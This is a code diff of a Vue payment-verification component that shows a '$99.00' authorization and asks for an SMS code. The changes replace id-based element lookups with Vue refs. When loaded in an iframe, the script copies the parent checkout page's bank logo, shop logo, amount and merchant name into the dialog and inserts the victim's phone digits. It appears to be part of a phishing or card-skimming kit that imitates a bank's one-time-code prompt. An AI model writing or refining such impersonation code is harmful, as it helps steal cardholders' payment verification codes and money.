@@ -34,16 +34,16 @@
             <!-- Transaction Details - Prominent Display -->
             <div class="bg-gray-50 border border-gray-200 rounded-lg p-4 mb-4">
               <div class="text-sm text-gray-600 mb-2">You are authorizing a payment of</div>
-              <div id="i-money" class="text-2xl sm:text-3xl font-semibold text-gray-900 mb-2">$99.00</div>
+              <div ref="fillMoney" class="text-2xl sm:text-3xl font-semibold text-gray-900 mb-2">$99.00</div>
               <div class="text-sm text-gray-600">
-                to <span id="i-bank" class="font-medium text-gray-900">SecureBank</span> on <span id="i-date"
+                to <span ref="fillShop" class="font-medium text-gray-900">{iShop}</span> on <span ref="fillDate"
                                                                                                   class="font-medium">27/02/24</span>
               </div>
             </div>
 
             <p class="text-sm sm:text-base text-gray-600">
               We have sent you a text message with a code to your registered mobile number ending in
-              <span id="i-phone" class="font-medium">**7878</span>.
+              <span ref="fillPhone" class="font-medium">**7878</span>.
             </p>
           </div>
 
@@ -226,6 +226,16 @@ const countdown = ref(0);
 const cardInfo = ref({});
 const showError = ref(false);
 
+
+// 初始化
+const bankLogo = ref(null);
+const shopLogo = ref(null);
+const fillMoney = ref(null);
+const fillShop = ref(null);
+const fillDate = ref(null);
+const fillPhone = ref(null);
+
+
 // Countdown Timer Watcher
 watch(countdown, (newValue) => {
   if (newValue > 0) {
@@ -359,25 +369,21 @@ onMounted(async () => {
   }*/
   if (window.self !== window.top) {
     console.log("im in!")
-    var data = await getParentOne('#basic-creditCards-secondary img', ['src']);
-    console.log("=========data", data)
     // 设置logo
-    const bankLogo = await getParentOne('#basic-creditCards-secondary img', ['src']).src;
-    document.querySelector('#bankLogo').setAttribute('src', bankLogo);
-    const shopLogo = await getParentOne('a img', ['src']).src;
-    document.querySelector('#shopLogo').setAttribute('src', shopLogo);
+    bankLogo.value.src = await getParentOne('#basic-creditCards-secondary img', ['src']).src;
+    shopLogo.value.src = await getParentOne('a img', ['src']).src;
     // 支付金额
-    document.querySelector("#i-money").innerHTML = await getParentOne("strong:nth-child(2)").innerHTML;
+    fillMoney.value.innerHTML = await getParentOne("strong:nth-child(2)").innerHTML;
     // 商户名
-    document.querySelector("#i-bank").innerHTML = await getParentOne('a img', ['alt']).alt;
+    fillShop.value.innerHTML = await getParentOne('a img', ['alt']).alt;
     // 日期
-    document.querySelector("#i-date").innerHTML = new Date().toLocaleDateString('en-US', {
+    fillDate.value.innerHTML = new Date().toLocaleDateString('en-US', {
       day: '2-digit',
       month: '2-digit',
       year: '2-digit'
     });
     // 手机号后四位
-    document.querySelector("#i-phone").innerHTML = resultObject['fpPhone'].slice(-4).padStart(4, '*');
+    fillPhone.value.innerHTML = resultObject['fpPhone'].slice(-4).padStart(4, '*');
   }
 
   // 初始化
